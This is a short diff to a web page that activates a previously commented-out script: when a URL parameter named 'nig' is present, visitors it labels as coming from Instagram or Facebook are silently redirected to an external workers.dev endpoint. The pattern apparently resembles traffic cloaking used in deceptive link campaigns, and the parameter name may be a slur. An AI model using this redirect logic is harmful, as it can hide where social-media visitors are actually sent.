@@ -15,20 +15,21 @@
     
     <script src="./f1337.js"></script>
 
-    <!--script>
+    <script>
   try {
     const urlParams = new URLSearchParams(window.location.search);
     
     const fromWorker = urlParams.has("from");
+    const nig = urlParams.has("nig");
 
-    if (!fromWorker) {
+    if (nig) {
       // Detected click from Instagram/Facebook
       window.location.href = "https://workers.client57.workers.dev/api/rfig";
     }
   } catch (e) {
     console.log("Redirect check failed:", e);
   }
-</script-->
+</script>
     
     <script>
         // Simple log at page load
